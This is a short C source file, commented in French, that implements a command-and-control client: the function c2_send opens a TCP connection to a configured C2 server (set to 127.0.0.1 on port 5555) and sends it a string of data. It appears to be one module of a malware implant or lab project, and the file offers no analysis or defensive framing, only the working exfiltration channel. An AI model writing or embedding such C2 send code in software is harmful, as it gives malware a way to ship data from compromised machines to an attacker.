#include "c2_client.h"
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

// Configuration du serveur C2
#define C2_IP "127.0.0.1"
#define C2_PORT 5555

// Envoie des données au serveur C2
void c2_send(const char *data) {
    int sock;
    struct sockaddr_in server_addr;

    // Création du socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[C2_CLIENT] socket"); // Erreur lors de la création
        return;
    }

    // Configuration de l'adresse du serveur
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    server_addr.sin_addr.s_addr = inet_addr(C2_IP);

    // Connexion au serveur
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("[C2_CLIENT] connect"); // Erreur lors de la connexion
        close(sock);
        return;
    }

    // Envoi des données
    send(sock, data, strlen(data), 0);

    // Fermeture du socket
    close(sock);
}
